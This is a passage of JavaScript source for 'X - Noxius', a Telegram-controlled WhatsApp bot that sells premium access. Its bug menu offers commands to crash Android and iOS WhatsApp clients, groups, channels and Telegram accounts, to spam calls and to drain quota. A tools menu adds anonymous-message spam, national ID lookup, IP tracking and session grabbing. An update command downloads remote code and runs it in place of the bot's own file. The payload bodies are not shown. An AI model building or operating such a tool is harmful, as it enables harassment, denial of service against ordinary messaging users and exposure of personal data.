⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀⠐⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

╔⫷ 𖤐 𝕴𝕹𝕱𝕺 𝕾𝕮𝕽𝕴𝕻𝕿 𖤐 ⫸╗
║
║ ⌁ Creator  ⟿ @VINSEXEJT1
║ ⌁ Script   ⟿ X - Noxius
║ ⌁ Version  ⟿ 1.0.0 Beta New
║ ⌁ Status   ⟿ Bot Connected
║
╚⫷ ⛧ 𝕾𝖞𝖘𝖙𝖊𝖒 𝕬𝖈𝖙𝖎𝖛𝖊 ⛧ ⫸╝
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Always',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        try {
        sock.newsletterFollow("120363330289360382@newsletter")
        } catch (_) {}
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢ Number: ${lastPairingMessage.phoneNumber}
 ▢ Pairing Code: ${lastPairingMessage.pairingCode}
 ▢ Status: Connected`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀
⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀⠐⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

╔⫷ 𖤐 𝕴𝕹𝕱𝕺 𝕾𝕮𝕽𝕴𝕻𝕿 𖤐 ⫸╗
║
║ ⌁ Creator  ⟿ @VINSEXEJT1
║ ⌁ Script   ⟿ X - Noxius
║ ⌁ Version  ⟿ 1.0.0 Beta New
║ ⌁ Status   ⟿ ⟢ SENDER ONLINE ⟣
║
╚⫷ ⛧ 𝕯𝖆𝖙𝖆 𝕾𝖙𝖗𝖊𝖆𝖒 𝕬𝖈𝖙𝖎𝖛𝖊 ⛧ ⫸╝
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();
sendNotif();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("requestpair", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ Akses hanya untuk owner");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 Example : /requestpair 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber);  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢ Number: ${phoneNumber}
 ▢ Pairing Code: ${formattedCode}
 ▢ Status: Not Connected`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢ Number: ${lastPairingMessage.phoneNumber}
 ▢ Pairing Code: ${lastPairingMessage.pairingCode}
 ▢ Status: Connected`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("update", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return ctx.reply("Akses ditolak");

  const filePath = "./index.js";

  try {
    const res = await axios.get(repoRaw + "?v=" + Date.now());

    if (!res.data) return ctx.reply("File kosong");

    const newData = res.data;
    const oldData = fs.existsSync(filePath)
      ? fs.readFileSync(filePath, "utf-8")
      : "";

    if (getHash(oldData) === getHash(newData)) {
      return ctx.reply("Tidak ada update");
    }

    fs.writeFileSync(filePath, newData);

    await ctx.reply("Update berhasil, restart...");

    setTimeout(() => process.exit(0), 2000);

  } catch (err) {
    console.error(err);
    ctx.reply("Error: " + err.message);
  }
});

bot.command("setcooldown", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ Akses hanya untuk owner");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 Example : /setcooldown 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetsessi", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ Akses hanya untuk owner");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Gagal menghapus session");
  }
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ Akses hanya untuk owner");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 Example : /addprem 12345678 30d");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ Akses hanya untuk owner");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 Example : /delprem 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgcprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ Akses hanya untuk owner");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 Example : /addgcprem -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgcprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ Akses hanya untuk owner");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 Example : /delgcprem -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ${groupId} tidak ada dalam daftar premium`);
    }
});

bot.use((ctx, next) => {
    if (secureMode) return;

    const text = (ctx.message && ctx.message.text) ? ctx.message.text : "";
    const data = (ctx.callbackQuery && ctx.callbackQuery.data) ? ctx.callbackQuery.data : "";
    const isStart = (typeof text === "string" && text.startsWith("/start")) ||
                    (typeof data === "string" && data === "/start");

    if (!tokenValidated && !isStart) {
        if (ctx.callbackQuery) {
            try { ctx.answerCbQuery("🔑 Masukkan token anda untuk diaktifkan. Example : /start <token>"); } catch (e) {}
        }
        return ctx.reply("🔒 Akses terkunci ketik /start <token> untuk mengaktifkan bot");
    }
    return next();
});

bot.start(async (ctx) => {
    if (!tokenValidated) {
      const raw = ctx.message && ctx.message.text ? ctx.message.text : "";
      const parts = raw.trim().split(" ");
      const userToken = parts.length > 1 ? parts[1].trim() : "";

      if (!userToken) {
        return ctx.reply("🔑 Masukkan token anda untuk diaktifkan. Example : /start <token>");
      }

      try {
        const res = await axios.get(databaseUrl);
        const tokens = (res.data && res.data.tokens) || [];

        if (!tokens.includes(userToken) || userToken !== tokenBot) {
          return ctx.reply("❌ Token tidak terdaftar, masukkan yang valid");
        }

        tokenValidated = true;
        return ctx.reply("✅ Token berhasil diaktifkan, ketik /start untuk membuka menu utama");
      } catch (e) {
        return ctx.reply("❌ Gagal memverifikasi token");
      }
    }

    const premiumStatus = isPremiumUser(ctx.from.id) ? "Has Prem" : "No Prem";
    const senderStatus = isWhatsAppConnected ? "Has Sender" : "No Sender";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const menuMessage = `( ⌭ ) – ɪ'ᴍ x̌ - ɴᴏxɪᴜx ᴀ ᴛᴇʟᴇɢʀᴀᴍ ʙᴏᴛ ʏᴀᴅᴢᴢɴᴏᴛ ʙʏ ᴅɪʟxᴢ ᴜsɪɴɢ ᴊᴀᴠᴀsᴄʀɪᴘᴛ ᴛᴇᴄʜɴᴏʟᴏɢʏ. ɪ ᴡᴀs ᴍᴀᴅᴇ ᴛᴏ ᴀssɪsᴛ ʏᴏᴜ, sᴏ ᴜsᴇ ᴍᴇ ᴡɪsᴇʟʏ.
 <blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
  ▢ Creator : @VINSEXEJT1
  ▢ Version : 1.0.0 Beta
  ▢ Prefix : / ( Slash )
  ▢ Language : JavaScript
  ▢ User : ${ctx.from.first_name}
  <blockquote><pre>⬡═―—⊱ ⎧ X - NOXIUS ⎭ ⊰―—═⬡</pre></blockquote>
  ▢ Memory : ${memoryStatus}
  ▢ Runtime : ${runtimeStatus}
  ▢ Cooldown : ${cooldownStatus} Second
  ▢ Sender Stats : ${senderStatus}
  ▢ Premium Stats : ${premiumStatus}`;

    const keyboard = [
        [
            { text: "⏤͟ ⌜   ⃟   SETTINGS ⌟",callback_data: "/controls",style:'danger' },
            { text: "⏤͟✧ ⌜ 𝕭𝖀𝕲 𝕸𝕰𝕹𝖀 ⌟",callback_data: "/bug",style:'danger' }
        ],
        [
            { text: "⏤͟ ⌜ ༒𝐓𝐎𝐎𝐋𝐒 ⌟",callback_data: "/tools",style:'danger' }
        ],
        [
            { text: "⏤͟ ⌜ ✧ 𝐎𝐖𝐍𝐄𝐑 ⌟",url:"https://t.me/VINSEXEJT1",style:'success' },
            { text: "⌜ ᴛʜᴀɴᴋꜱ ⌟ ✧⋆˚", callback_data: "/tqt9", style:'success' }
        ]
    ];

    return ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

bot.action('/start', async (ctx) => {
    if (!tokenValidated) {
        try { await ctx.answerCbQuery(); } catch (e) {}
        return ctx.reply("🔑 Masukkan token anda untuk diaktifkan. Example : /start <token>");
    }
    
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Has Prem" : "No Prem";
    const senderStatus = isWhatsAppConnected ? "Has Sender" : "No Sender";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
  
    const menuMessage = `( ⌭ ) – ɪ'ᴍ x̌ - ɴᴏxɪᴜx ᴀ ᴛᴇʟᴇɢʀᴀᴍ ʙᴏᴛ ʏᴀᴅᴢᴢɴᴏᴛ ʙʏ ᴅɪʟxᴢ ᴜsɪɴɢ ᴊᴀᴠᴀsᴄʀɪᴘᴛ ᴛᴇᴄʜɴᴏʟᴏɢʏ. ɪ ᴡᴀs ᴍᴀᴅᴇ ᴛᴏ ᴀssɪsᴛ ʏᴏᴜ, sᴏ ᴜsᴇ ᴍᴇ ᴡɪsᴇʟʏ.
 <blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
  ▢ Creator : @VINSEXEJT1
  ▢ Version : 1.0.0 Beta
  ▢ Prefix : / ( Slash )
  ▢ Language : JavaScript
  ▢ User : ${ctx.from.first_name}
  <blockquote><pre>⬡═―—⊱ ⎧ X - NOXIUS ⎭ ⊰―—═⬡</pre></blockquote>
  ▢ Memory : ${memoryStatus}
  ▢ Runtime : ${runtimeStatus}
  ▢ Cooldown : ${cooldownStatus} Second
  ▢ Sender Stats : ${senderStatus}
  ▢ Premium Stats : ${premiumStatus}`;

    const keyboard = [
        [
            { text: "⏤͟ ⌜   ⃟   SETTINGS ⌟",callback_data: "/controls",style:'danger' },
            { text: "⏤͟✧ ⌜ 𝕭𝖀𝕲 𝕸𝕰𝕹𝖀 ⌟",callback_data: "/bug",style:'danger' }
        ],
        [
            { text: "⏤͟ ⌜ ༒𝐓𝐎𝐎𝐋𝐒 ⌟",callback_data: "/tools",style:'danger' }
        ],
        [
            { text: "⏤͟ ⌜ ✧ 𝐎𝐖𝐍𝐄𝐑 ⌟",url:"https://t.me/VINSEXEJT1",style:'success' },
            { text: "⌜ ᴛʜᴀɴᴋꜱ ⌟ ✧⋆˚", callback_data: "/tqto", style:'success' }
        ]
    ];
    
    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Invalid request: message is not modified: the new message content and the specified reply markup are exactly the same as the current message content and reply markup.") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/controls', async (ctx) => {
    const controlsMenu = `
╔⫷ 𖤐 𝕏̌ - 𝕹𝖔𝖝𝖎𝖚𝖘 𝕮𝖔𝖗𝖊 𖤐 ⫸╗
║
║ ⌭ ɪ'ᴍ X̌ - Noxius, a telegram bot
║ ⌭ developed by Dilxz using JavaScript
║ ⌭ built to assist — use wisely
║
╚⫷ ⛧ 𝕬𝕴 𝕾𝖞𝖘𝖙𝖊𝖒 𝕬𝖈𝖙𝖎𝖛𝖊 ⛧ ⫸╝

<blockquote><pre>
⬡═―—⊱ ⎧ 𝕭𝖔𝖙 𝕴𝖓𝖋𝖔 ⎭ ⊰―—═⬡
</pre></blockquote>
▢ Creator   ⟿ @VINSEXEJT1
▢ Version   ⟿ 1.0.0 Beta
▢ Prefix    ⟿ / (Slash)
▢ Language  ⟿ JavaScript
▢ User      ⟿ ${ctx.from.first_name}

<blockquote><pre>
⬡═―—⊱ ⎧ 𝕮𝖔𝖓𝖙𝖗𝖔𝖑 𝕻𝖆𝖓𝖊𝖑 ⎭ ⊰―—═⬡
</pre></blockquote>
▢ /requestpair   ⟿ Add Sender Number
▢ /update      ⟿ update for script
▢ /resetsessi    ⟿ Reset Session
▢ /setcooldown   ⟿ Set Bot Cooldown
▢ /addgcprem     ⟿ Add Premium Group
▢ /delgcprem     ⟿ Remove Premium Group
▢ /addprem       ⟿ Add Premium User
▢ /delprem       ⟿ Remove Premium User
▢ /addmute       ⟿ Mute User
▢ /delmute       ⟿ Unmute User

<blockquote><pre>
⬡═―—⊱ ⎧ 𝕾𝖊𝖈𝖚𝖗𝖎𝖙𝖞 𝕾𝖞𝖘𝖙𝖊𝖒 ⎭ ⊰―—═⬡
</pre></blockquote>
▢ /antibypass    ⟿ Enable Protection
▢ /keybypass     ⟿ Bypass Premium Access
▢ /addkey        ⟿ Add Security Key
▢ /allsecurity   ⟿ Full Protection Mode

<blockquote><pre>
⛧ 𝕾𝖞𝖘𝖙𝖊𝖒 𝕽𝖚𝖓𝖓𝖎𝖓𝖌 • 𝕹𝖔 𝕷𝖎𝖒𝖎𝖙 ⛧
</pre></blockquote>`;

    const keyboard = [
        [
            {
                text: "🔙 ⌜ ƙҽɱႦαʅι ⌟",
                callback_data: "/start"
            }
        ], 
        [
            { 
                text: "⌜ CHANNEL ⌟", 
                url: "https://t.me/toolsrusianbots" 
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Invalid request: message is not modified: the new message content and the specified reply markup are exactly the same as the current message content and reply markup.") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bug', async (ctx) => {
    const bugMenu = `
╔⫷ 𖤐 𝕏̌ - 𝕹𝖔𝖝𝖎𝖚𝖘 𖤐 ⫸╗
║
║ ⌭ ɪ'ᴍ X̌ - Noxius, a Telegram bot
║ ⌭ developed by Dilxz with JavaScript
║ ⌭ built to assist you — use wisely
║
╚⫷ ⛧ 𝕾𝖞𝖘𝖙𝖊𝖒 𝕬𝖈𝖙𝖎𝖛𝖊 ⛧ ⫸╝
<blockquote><pre>
⬡═―—⊱ ⎧ 𝕭𝖔𝖙 𝕴𝖓𝖋𝖔 ⎭ ⊰―—═⬡
</pre></blockquote>
▢ Creator   ⟿ @VINSEXEJT1
▢ Version   ⟿ 1.0.0 Beta
▢ Prefix    ⟿ / (Slash)
▢ Language  ⟿ JavaScript
▢ User      ⟿ ${ctx.from.first_name}

<blockquote><pre>
⬡═―—⊱ ⎧ 𝕏̌ - 𝕹𝖔𝖝𝖎𝖚𝖘 𝕭𝖀𝕲 𝕻𝖆𝖓𝖊𝖑 ⎭ ⊰―—═⬡
</pre></blockquote>
✧ /forclose       ⟿ Force Close Click
✧ /blankui        ⟿ Blank UI Trigger
✧ /xcrash         ⟿ Android UI Crash
✧ /bulldozer      ⟿ Drain System Quota
✧ /crashmention   ⟿ Invisible Mention Crash
✧ /crashiphone    ⟿ iOS System Crash
✧ /forceiphone    ⟿ Force iOS System
✧ /spamcall       ⟿ Call Spam Trigger
✧ /testfunction   ⟿ Execute Custom Function
✧ /fixedbug       ⟿ Clear Bug Logs
✧ /blankgroup     ⟿ Blank Group ID
✧ /crashgroup     ⟿ Crash Group ID
✧ /crashchannel   ⟿ Crash Channel ID
✧ /teleblank      ⟿ Blank Telegram ID
✧ /telecrash      ⟿ Crash Telegram ID

<blockquote><pre>
⚠ 𝕳𝖎𝖌𝖍 𝕽𝖎𝖘𝖐 𝕮𝖔𝖒𝖒𝖆𝖓𝖉𝖘 • 𝖀𝖘𝖊 𝖂𝖎𝖘𝖊𝖑𝖞 ⚠
</pre></blockquote>`;

    const keyboard = [
        [
            {
                text: "🔙 ⌜ ƙҽɱႦαʅι ⌟",
                callback_data: "/start"
            }
        ], 
        [
            { 
                text: "⌜ CHANNEL ⌟", 
                url: "https://t.me/toolsrusianbots" 
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Invalid request: message is not modified: the new message content and the specified reply markup are exactly the same as the current message content and reply markup.") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tools', async (ctx) => {
    const toolsMenu = `
╔⫷ 𖤐 𝕏̌ - 𝕹𝖔𝖝𝖎𝖚𝖘 𖤐 ⫸╗
║
║ ⌭ ɪ'ᴍ X̌ - Noxius, a Telegram bot
║ ⌭ developed by Dilxz using JavaScript
║ ⌭ built to assist you — use wisely
║
╚⫷ ⛧ 𝕾𝖞𝖘𝖙𝖊𝖒 𝕬𝖈𝖙𝖎𝖛𝖊 ⛧ ⫸╝
<blockquote><pre>
⬡═―—⊱ ⎧ 𝕭𝖔𝖙 𝕴𝖓𝖋𝖔 ⎭ ⊰―—═⬡
</pre></blockquote>
▢ Creator   ⟿ @VINSEXEJT1
▢ Version   ⟿ 1.0.0 Beta
▢ Prefix    ⟿ / (Slash)
▢ Language  ⟿ JavaScript
▢ User      ⟿ ${ctx.from.first_name}

<blockquote><pre>
⬡═―—⊱ ⎧ 𝕏̌ - 𝕹𝖔𝖝𝖎𝖚𝖘 𝕿𝖔𝖔𝖑𝖘 ⎭ ⊰―—═⬡
</pre></blockquote>
▢ /tiktokmp4   ⟿ Download TikTok Video
▢ /tiktokmp3   ⟿ Extract TikTok Audio
▢ /spamngl     ⟿ Send Anonymous Message
▢ /gethtml     ⟿ Generate HTML Code
▢ /iosqc       ⟿ Create iOS Quote Image
▢ /tourl       ⟿ Convert Media to URL
▢ /cekid       ⟿ Check Telegram User ID
▢ /status      ⟿ Bot Status Information
▢ /restart     ⟿ Restart Bot System
▢ /nikparse    ⟿ NIK Data Viewer
▢ /trackip     ⟿ IP Information Lookup
▢ /csessions1  ⟿ Get Session Panel V1
▢ /csessions2  ⟿ Get Session Panel V2
▢ /ai          ⟿ AI Assistant Engine

<blockquote><pre>
⛧ 𝕿𝖔𝖔𝖑𝖘 𝕽𝖊𝖆𝖉𝖞 • 𝕬𝖈𝖈𝖊𝖘𝖘 𝕾𝖙𝖆𝖇𝖑𝖊 ⛧
</pre></blockquote>`;
  
    const keyboard = [
        [
            {
                text: "🔙 ⌜ ƙҽɱႦαʅι ⌟",
